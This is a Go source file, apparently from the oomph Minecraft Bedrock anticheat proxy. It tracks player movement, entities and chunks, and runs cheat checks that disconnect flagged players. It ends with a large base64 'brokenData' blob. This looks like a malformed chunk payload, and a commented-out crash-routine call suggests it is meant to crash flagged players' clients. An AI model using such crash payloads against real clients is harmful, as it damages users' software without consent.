package player

import (
	"encoding/base64"
	"fmt"
	"math"
	"math/rand"
	"sync"
	"time"

	"github.com/df-mc/dragonfly/server/event"

	"github.com/df-mc/dragonfly/server/block/cube"
	"github.com/df-mc/dragonfly/server/entity/physics"
	"github.com/df-mc/dragonfly/server/world"
	"github.com/df-mc/dragonfly/server/world/chunk"
	"github.com/go-gl/mathgl/mgl32"
	"github.com/go-gl/mathgl/mgl64"
	"github.com/justtaldevelops/oomph/check"
	"github.com/justtaldevelops/oomph/entity"
	"github.com/justtaldevelops/oomph/omath"
	"github.com/justtaldevelops/oomph/session"
	"github.com/justtaldevelops/oomph/utils"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"github.com/sirupsen/logrus"
	"go.uber.org/atomic"
)

// Player contains information about a player, such as its virtual world.
type Player struct {
	log              *logrus.Logger
	conn, serverConn *minecraft.Conn

	rid      uint64
	uid      int64
	viewDist int32

	chunkMu sync.Mutex
	chunks  map[world.ChunkPos]*chunk.Chunk

	acknowledgements map[int64]func()
	ackMu            sync.Mutex

	dimension world.Dimension

	serverTicker *time.Ticker
	clientTick   uint64
	serverTick   uint64

	// s holds the session of the player.
	s atomic.Value

	// h holds the current handler of the player. It may be changed at any time by calling the Start method.
	h      Handler
	hMutex sync.RWMutex

	entityMu              sync.Mutex
	entities              map[uint64]entity.Entity
	queuedEntityLocations map[uint64]mgl64.Vec3

	effects   map[int32]*effect
	effectsMu sync.Mutex

	checkMu sync.Mutex
	checks  []check.Check

	closed atomic.Bool
}

// NewPlayer creates a new player from the given identity data, client data, position, and world.
func NewPlayer(log *logrus.Logger, dimension world.Dimension, viewDist int32, conn, serverConn *minecraft.Conn) *Player {
	data := conn.GameData()
	p := &Player{
		log: log,

		conn:       conn,
		serverConn: serverConn,

		rid:      data.EntityRuntimeID,
		uid:      data.EntityUniqueID,
		viewDist: viewDist,

		chunks:    make(map[world.ChunkPos]*chunk.Chunk),
		dimension: dimension,

		h: NopHandler{},

		acknowledgements: make(map[int64]func()),

		entities:              make(map[uint64]entity.Entity),
		queuedEntityLocations: make(map[uint64]mgl64.Vec3),

		effects: make(map[int32]*effect),

		serverTicker: time.NewTicker(time.Second / 20),
		checks: []check.Check{
			&check.AimAssistA{},
			&check.KillAuraA{}, &check.KillAuraB{Entities: make(map[uint64]entity.Entity)},
			&check.TimerA{},
			&check.ReachA{},
			&check.AutoclickerA{}, &check.AutoclickerB{}, &check.AutoclickerC{}, &check.AutoclickerD{},
			&check.VelocityA{}, &check.VelocityB{},
			&check.InvalidMovementA{}, &check.InvalidMovementB{}, &check.InvalidMovementC{},
		},
	}

	var checks []check.Check
	for _, c := range p.checks {
		if c.BaseSettings().Enabled {
			checks = append(checks, c)
		}
	}
	p.checks = checks

	// Validate device OS
	osCheck := &check.OSSpoofer{GivenOS: conn.ClientData().DeviceOS, TitleID: conn.IdentityData().TitleID}
	if osCheck.BaseSettings().Enabled {
		osCheck.Process(p, nil)
	}

	s := &session.Session{}
	s.Movement = &session.Movement{
		Session:       s,
		JumpVelocity:  utils.DefaultJumpMotion,
		Gravity:       utils.NormalGravity,
		MovementSpeed: utils.NormalMovementSpeed,
	}
	p.s.Store(s)
	p.Session().EntityData.Store(entity.Entity{
		Location: entity.Location{
			Position: omath.Vec32To64(data.PlayerPosition),
			Rotation: omath.Vec32To64(mgl32.Vec3{data.Pitch, data.Yaw, data.Yaw}),
		},
	})
	go p.startTicking()
	return p
}

// Move moves the player to the given position.
func (p *Player) Move(pk *packet.PlayerAuthInput) {
	s := p.Session()
	data := s.GetEntityData()
	data.LastPosition = data.Position
	data.Position = omath.Vec32To64(pk.Position.Sub(mgl32.Vec3{0, 1.62, 0}))
	data.AABB = physics.NewAABB(data.Position.Sub(mgl64.Vec3{data.BBWidth, 0, data.BBWidth}), data.Position.Add(mgl64.Vec3{data.BBWidth, data.BBHeight, data.BBWidth}))
	data.LastRotation = data.Rotation
	data.Rotation = mgl64.Vec3{float64(pk.Pitch), float64(pk.Yaw), float64(pk.HeadYaw)}
	data.TeleportTicks++
	s.EntityData.Store(data)
	s.Movement.Motion = data.Position.Sub(data.LastPosition)

	p.cleanCache()
}

// Teleport sets the position of the player and resets the teleport ticks
func (p *Player) Teleport(pos mgl32.Vec3) {
	data := p.Session().GetEntityData()
	data.LastPosition = data.Position
	data.Position = omath.Vec32To64(pos.Sub(mgl32.Vec3{0, 1.62}))
	data.TeleportTicks = 0
	p.Session().EntityData.Store(data)

	p.cleanCache()
}

// Rotate rot is a Vector3 holding the rotation values (pitch, yaw, headyaw)
func (p *Player) Rotate(rot mgl32.Vec3) {
	data := p.Session().GetEntityData()
	data.LastRotation = data.Rotation
	data.Rotation = omath.Vec32To64(rot)
	p.Session().EntityData.Store(data)
}

// MoveActor moves an actor to the given position.
func (p *Player) MoveActor(rid uint64, pos mgl64.Vec3) {
	_, ok := p.Entity(rid)
	if ok {
		// if the entity is valid, we can queue the location for an update
		p.queueEntityLocation(rid, pos)
	}
}

// Location returns the current location of the player.
func (p *Player) Location() entity.Location {
	return p.Session().GetEntityData().Location
}

// ChunkPosition returns the chunk position of the player.
func (p *Player) ChunkPosition() world.ChunkPos {
	loc := p.Location()
	return world.ChunkPos{int32(math.Floor(loc.Position[0])) >> 4, int32(math.Floor(loc.Position[2])) >> 4}
}

// ServerTick returns the current "server" tick.
func (p *Player) ServerTick() uint64 {
	return p.serverTick
}

// ClientTick returns the current client tick. This is measured by the amount of PlayerAuthInput packets the
// client has sent (since the packet is sent every client tick)
func (p *Player) ClientTick() uint64 {
	return p.clientTick
}

// Session returns the session assigned to the player.
func (p *Player) Session() *session.Session {
	return p.s.Load().(*session.Session)
}

// Acknowledgement runs a function after an acknowledgement from the client.
// TODO: Stop abusing NSL!
func (p *Player) Acknowledgement(f func()) {
	t := int64(rand.Int31()) * 1000 // ensure that we don't get screwed over because the number is too fat
	if t < 0 {
		t *= -1
	}
	_ = p.conn.WritePacket(&packet.NetworkStackLatency{Timestamp: t, NeedsResponse: true})
	p.ackMu.Lock()
	p.acknowledgements[t] = f
	p.ackMu.Unlock()
}

// handleAcknowledgement handles an acknowledgement function in the acknowledgement map
func (p *Player) handleAcknowledgement(t int64) {
	p.ackMu.Lock()
	call, ok := p.acknowledgements[t]
	if ok {
		call()
		delete(p.acknowledgements, t)
	}
	p.ackMu.Unlock()
}

// Process processes the given packet.
func (p *Player) Process(pk packet.Packet, fromClient bool) {
	if fromClient {
		p.Session().SetFlag(false, session.FlagClicking)
		switch pk := pk.(type) {
		case *packet.NetworkStackLatency:
			p.handleAcknowledgement(pk.Timestamp)
		case *packet.PlayerAuthInput:
			p.clientTick++
			p.Move(pk)
			p.Rotate(mgl32.Vec3{pk.Pitch, pk.Yaw, pk.HeadYaw})
			s := p.Session()

			for inputFlags, sessionFlag := range session.InputFlagMap {
				if utils.HasFlag(pk.InputData, inputFlags[0]) {
					s.SetFlag(true, sessionFlag)
				} else if utils.HasFlag(pk.InputData, inputFlags[1]) {
					s.SetFlag(false, sessionFlag)
				}
			}

			s.SetFlag(utils.HasFlag(pk.InputData, packet.InputFlagStartJumping), session.FlagJumping)

			s.Movement.JumpVelocity = utils.DefaultJumpMotion
			s.Movement.Gravity = utils.NormalGravity
			s.Movement.MovementSpeed = utils.NormalMovementSpeed

			p.effectsMu.Lock()
			for effectId, effect := range p.effects {
				effect.Duration--
				if effect.Duration <= 0 {
					delete(p.effects, effectId)
				} else {
					switch effectId {
					case packet.EffectJumpBoost:
						s.Movement.JumpVelocity = utils.DefaultJumpMotion + (float64(effect.Amplifier) / 10)
					case 27: // slow falling effect id
						s.Movement.Gravity = utils.SlowFallingGravity
					case packet.EffectSpeed:
						s.Movement.MovementSpeed += 0.02 * float64(effect.Amplifier)
					case packet.EffectSlowness:
						s.Movement.MovementSpeed -= 0.015 * float64(effect.Amplifier) // TODO: Correctly account when both slowness and speed effects are applied
					}
				}
			}
			p.effectsMu.Unlock()

			s.SetFlag(false, session.FlagTeleporting)
			loc := p.Location()
			s.SetFlag(loc.Position.Y() <= utils.VoidLevel, session.FlagInVoid)

			s.Movement.MoveStrafe = float64(pk.MoveVector.X() * 0.98)
			s.Movement.MoveForward = float64(pk.MoveVector.Y() * 0.98)

			if s.HasFlag(session.FlagSprinting) {
				s.Movement.MovementSpeed *= 1.3
			}
			s.Movement.MovementSpeed = math.Max(0, s.Movement.MovementSpeed)

			c, ok := p.Chunk(world.ChunkPos{int32(loc.Position.X()) >> 4, int32(loc.Position.Z()) >> 4})
			s.SetFlag(!ok, session.FlagInUnloadedChunk)
			if ok {
				c.Unlock()
			}

			s.Movement.Execute(p)
			p.handleBlockTicks()
			p.tickEntityLocations()
		case *packet.LevelSoundEvent:
			if pk.SoundType == packet.SoundEventAttackNoDamage {
				p.Session().Click(p.ClientTick())
			}
		case *packet.InventoryTransaction:
			if _, ok := pk.TransactionData.(*protocol.UseItemOnEntityTransactionData); ok {
				p.Session().Click(p.ClientTick())
			}
		case *packet.AdventureSettings:
			p.Session().SetFlag(utils.HasFlag(uint64(pk.Flags), packet.AdventureFlagFlying), session.FlagFlying)
		case *packet.Respawn:
			if pk.EntityRuntimeID == p.rid && pk.State == packet.RespawnStateClientReadyToSpawn {
				p.Session().SetFlag(false, session.FlagDead)
			}
		case *packet.Text:
			if p.serverConn != nil {
				pk.XUID = ""
			}
		}

		// Run all registered checks.
		p.checkMu.Lock()
		for _, c := range p.checks {
			c.Process(p, pk)
		}
		p.checkMu.Unlock()
	} else {
		switch pk := pk.(type) {
		case *packet.AddPlayer:
			if pk.EntityRuntimeID == p.rid {
				return
			}
			p.Acknowledgement(func() {
				p.UpdateEntity(pk.EntityRuntimeID, entity.Entity{
					Location: entity.Location{
						Position:                 omath.Vec32To64(pk.Position),
						LastPosition:             omath.Vec32To64(pk.Position),
						RecievedPosition:         omath.Vec32To64(pk.Position).Add(omath.Vec32To64(pk.Velocity)),
						NewPosRotationIncrements: 3,
						Rotation:                 omath.Vec32To64(mgl32.Vec3{pk.Pitch, pk.Yaw, pk.HeadYaw}),
					},
					AABB: physics.NewAABB(
						omath.Vec32To64(pk.Position).Sub(mgl64.Vec3{0.3, 0, 0.3}),
						omath.Vec32To64(pk.Position).Add(mgl64.Vec3{0.3, 1.8, 0.3}),
					),
					BBWidth:  0.3,
					BBHeight: 1.8,
					IsPlayer: true,
				})
			})
		case *packet.AddActor:
			if pk.EntityRuntimeID == p.rid {
				return
			}
			p.Acknowledgement(func() {
				p.UpdateEntity(pk.EntityRuntimeID, entity.Entity{
					Location: entity.Location{
						Position:                 omath.Vec32To64(pk.Position),
						LastPosition:             omath.Vec32To64(pk.Position),
						RecievedPosition:         omath.Vec32To64(pk.Position).Add(omath.Vec32To64(pk.Velocity)),
						NewPosRotationIncrements: 3,
						Rotation:                 omath.Vec32To64(mgl32.Vec3{pk.Pitch, pk.Yaw, pk.HeadYaw}),
					},
					AABB: physics.NewAABB(
						omath.Vec32To64(pk.Position).Sub(mgl64.Vec3{0.3, 0, 0.3}),
						omath.Vec32To64(pk.Position).Add(mgl64.Vec3{0.3, 1.8, 0.3}),
					),
					BBWidth:  0.3,
					BBHeight: 1.8,
					IsPlayer: false,
				})
			})
		case *packet.MoveActorAbsolute:
			rid := pk.EntityRuntimeID
			if rid == p.rid {
				p.Acknowledgement(func() {
					p.Teleport(pk.Position)
					if utils.HasFlag(uint64(pk.Flags), packet.MoveFlagTeleport) {
						p.Session().SetFlag(true, session.FlagTeleporting)
					}
				})
				return
			}
			p.MoveActor(rid, omath.Vec32To64(pk.Position))
		case *packet.MovePlayer:
			if pk.EntityRuntimeID == p.rid {
				p.Acknowledgement(func() {
					p.Teleport(pk.Position)
					if pk.Mode == packet.MoveModeTeleport {
						p.Session().SetFlag(true, session.FlagTeleporting)
					}
				})
			}
		case *packet.LevelChunk:
			p.Acknowledgement(func() {
				p.LoadRawChunk(world.ChunkPos{pk.Position.X(), pk.Position.Z()}, pk.RawPayload, pk.SubChunkCount)
			})
		case *packet.UpdateBlock:
			block, ok := world.BlockByRuntimeID(pk.NewBlockRuntimeID)
			if ok {
				p.Acknowledgement(func() {
					p.SetBlock(protocolPosToCubePos(pk.Position), block)
				})
			}
		case *packet.SetActorData:
			if pk.EntityRuntimeID == p.rid {
				p.Acknowledgement(func() {
					data := p.Session().GetEntityData()
					hasFlag := func(flag uint32, data int64) bool {
						return (data & (1 << (flag % 64))) > 0
					}
					if f, ok := pk.EntityMetadata[entity.DataKeyBoundingBoxWidth]; ok {
						data.BBWidth = float64(f.(float32)) / 2
					}
					if f, ok := pk.EntityMetadata[entity.DataKeyBoundingBoxHeight]; ok {
						data.BBHeight = float64(f.(float32))
					}
					p.Session().EntityData.Store(data)
					if f, ok := pk.EntityMetadata[entity.DataKeyFlags]; ok {
						p.Session().SetFlag(hasFlag(entity.DataFlagImmobile, f.(int64)), session.FlagImmobile)
					}
				})
			} else {
				p.Acknowledgement(func() {
					if e, ok := p.Entity(pk.EntityRuntimeID); ok {
						if f, ok := pk.EntityMetadata[entity.DataKeyBoundingBoxWidth]; ok {
							e.BBWidth = float64(f.(float32)) / 2
						}
						if f, ok := pk.EntityMetadata[entity.DataKeyBoundingBoxHeight]; ok {
							e.BBHeight = float64(f.(float32))
						}
						p.UpdateEntity(pk.EntityRuntimeID, e)
					}
				})
			}
		case *packet.StartGame:
			p.Acknowledgement(func() {
				p.Session().Gamemode = pk.WorldGameMode
			})
		case *packet.SetPlayerGameType:
			p.Acknowledgement(func() {
				p.Session().Gamemode = pk.GameType
			})
		case *packet.SetActorMotion:
			if pk.EntityRuntimeID == p.rid {
				p.Acknowledgement(func() {
					p.Session().Movement.ServerSentMotion = pk.Velocity
					p.Session().Ticks.Motion = 0
				})
			}
		case *packet.RemoveActor:
			if pk.EntityUniqueID != p.uid {
				p.Acknowledgement(func() {
					p.RemoveEntity(uint64(pk.EntityUniqueID))
				})
			}
		case *packet.UpdateAttributes:
			if pk.EntityRuntimeID == p.rid {
				p.Acknowledgement(func() {
					for _, a := range pk.Attributes {
						if a.Name == "minecraft:health" && a.Value <= 0 {
							p.Session().SetFlag(true, session.FlagDead)
						}
					}
				})
			}
		case *packet.MobEffect:
			if pk.EntityRuntimeID == p.rid {
				p.Acknowledgement(func() {
					switch pk.Operation {
					case packet.MobEffectAdd:
						p.AddEffect(pk.EffectType, &effect{pk.Amplifier + 1, pk.Duration})
					case packet.MobEffectModify:
						if effect, ok := p.GetEffect(pk.EffectType); ok {
							effect.Amplifier = pk.Amplifier + 1
							effect.Duration = pk.Duration
						}
					case packet.MobEffectRemove:
						p.RemoveEffect(pk.EffectType)
					}
				})
			}
		}
	}
}

// Debug debugs the given check data to the console and other relevant sources.
func (p *Player) Debug(check check.Check, params map[string]interface{}) {
	name, variant := check.Name()
	ctx := event.C()
	p.handler().HandleDebug(ctx, check, params)
	ctx.Continue(func() {
		p.log.Debugf("%s (%s%s): %s", p.Name(), name, variant, utils.PrettyParams(params))
	})
}

// Flag flags the given check data to the console and other relevant sources.
func (p *Player) Flag(check check.Check, params map[string]interface{}) {
	name, variant := check.Name()
	check.TrackViolation()

	ctx := event.C()
	p.handler().HandleFlag(ctx, check, params)
	ctx.Continue(func() {
		p.log.Infof("%s was flagged for %s%s! %s", p.Name(), name, variant, utils.PrettyParams(params))
	})

	if now, max := check.Violations(), check.BaseSettings().MaxViolations; now >= float64(max) {
		ctx := event.C()
		p.handler().HandlePunishment(ctx, check)
		ctx.Continue(func() {
			p.log.Infof("%s was caught lackin for %s%s!", p.Name(), name, variant)
			p.Disconnect(fmt.Sprintf("§7[§6oomph§7] §bCaught lackin!\n§6Reason: §b%s%s", name, variant))
			//p.BeginCrashRoutine()
		})
		return
	}
}

// Name ...
func (p *Player) Name() string {
	return p.conn.IdentityData().DisplayName
}

// Disconnect disconnects the player for the reason provided.
func (p *Player) Disconnect(reason string) {
	_ = p.conn.WritePacket(&packet.Disconnect{Message: reason})
	p.ClosePlayer()
}

// ClosePlayer closes the player.
func (p *Player) ClosePlayer() {
	_ = p.conn.Close()
	if p.serverConn != nil {
		_ = p.serverConn.Close()
	}

	p.serverTicker.Stop()

	p.chunkMu.Lock()
	p.chunks = nil
	p.chunkMu.Unlock()

	p.checkMu.Lock()
	p.checks = nil
	p.checkMu.Unlock()

	p.closed.Store(true)
}

// startTicking ticks the player until the connection is closed.
func (p *Player) startTicking() {
	for range p.serverTicker.C {
		p.flushEntityLocations()
		p.conn.Flush() // make sure the network stack latency packet gets to the client ASAP
		p.serverTick++
	}
}

// protocolPosToCubePos converts a protocol.BlockPos to a cube.Pos.
func protocolPosToCubePos(pos protocol.BlockPos) cube.Pos {
	return cube.Pos{int(pos.X()), int(pos.Y()), int(pos.Z())}
}

// air returns the air runtime ID.
func air() uint32 {
	a, _ := chunk.StateToRuntimeID("minecraft:air", nil)
	return a
}

// queueEntityLocation is called when an entity location should be queued to update
// and lag compensate with NSL
func (p *Player) queueEntityLocation(rid uint64, pos mgl64.Vec3) {
	p.queuedEntityLocations[rid] = pos
}

// tickEntityLocations ticks entity locations to simulate what the client would see for the
func (p *Player) tickEntityLocations() {
	for eid := range p.entities {
		e, _ := p.Entity(eid)
		if e.NewPosRotationIncrements > 0 {
			delta := e.RecievedPosition.Sub(e.LastPosition).Mul(1 / float64(e.NewPosRotationIncrements))
			e.LastPosition = e.Position
			e.Position = e.Position.Add(delta)
			e.AABB = physics.NewAABB(
				e.Position.Sub(mgl64.Vec3{e.BBWidth, 0, e.BBWidth}),
				e.Position.Add(mgl64.Vec3{e.BBWidth, e.BBHeight, e.BBWidth}),
			)
			e.NewPosRotationIncrements--
		}
		e.TeleportTicks++
		p.UpdateEntity(eid, e)
	}
}

// flushEntityLocations clears the queued entity location map, and sends an acknowledgement to the player
// This allows us to know when the client has recieved positions of other entities
func (p *Player) flushEntityLocations() {
	queue := p.queuedEntityLocations
	p.queuedEntityLocations = make(map[uint64]mgl64.Vec3)
	p.Acknowledgement(func() {
		for rid, pos := range queue {
			if e, valid := p.Entity(rid); valid {
				e.RecievedPosition = pos
				e.NewPosRotationIncrements = 3
				p.UpdateEntity(rid, e)
			}
		}
	})
}

// handleBlockTicks is called once every client tick to update block ticks
func (p *Player) handleBlockTicks() {
	var liquids, cobweb, climable uint32
	for _, v := range utils.DefaultCheckBlockSettings(p.Session().GetEntityData().AABB.Grow(0.2), p).SearchAll() {
		if _, ok := v.(world.Liquid); ok {
			liquids++
		} else {
			name, _ := v.EncodeBlock()
			if name == "minecraft:ladder" || name == "minecraft:vine" {
				climable++
			} else if name == "minecraft:cobweb" {
				cobweb++
			}
		}
	}

	s := p.Session()
	if liquids == 0 {
		s.Ticks.Liquid++
	} else {
		s.Ticks.Liquid = 0
	}
	if cobweb == 0 {
		s.Ticks.Cobweb++
	} else {
		s.Ticks.Cobweb = 0
	}
	if climable == 0 {
		s.Ticks.Climable++
	} else {
		s.Ticks.Climable = 0
	}

	if !s.HasFlag(session.FlagDead) {
		s.Ticks.Spawn++
	} else {
		s.Ticks.Spawn = 0
	}

	s.Ticks.Motion++
}

func (p *Player) AddEffect(effectId int32, effect *effect) {
	p.effectsMu.Lock()
	p.effects[effectId] = effect
	p.effectsMu.Unlock()
}

func (p *Player) GetEffect(effectId int32) (*effect, bool) {
	p.effectsMu.Lock()
	effect, ok := p.effects[effectId]
	p.effectsMu.Unlock()
	return effect, ok
}

func (p *Player) RemoveEffect(effectId int32) {
	p.effectsMu.Lock()
	delete(p.effects, effectId)
	p.effectsMu.Unlock()
}

func (p *Player) AABB() physics.AABB {
	return p.Session().GetEntityData().AABB
}

// Handle sets the handler of the player.
func (p *Player) Handle(h Handler) {
	p.hMutex.Lock()
	p.h = h
	p.hMutex.Unlock()
}

// handler returns the handler of the player.
func (p *Player) handler() Handler {
	p.hMutex.Lock()
	defer p.hMutex.Unlock()
	return p.h
}

var brokenData []byte

func init() {
	brokenData, _ = base64.StdEncoding.DecodeString("CQH8BekAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAADpAAAA6QAAAOkAAAAIjALUA4hGik4JAP0JAP4JAP8JAAAJAAEJAAIJAAMJAAQJAAUJAAYJAAcJAAgJAAkJAAoJAAsJAAwJAA0JAA4JAA8JABAJABEJABIJABMJABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////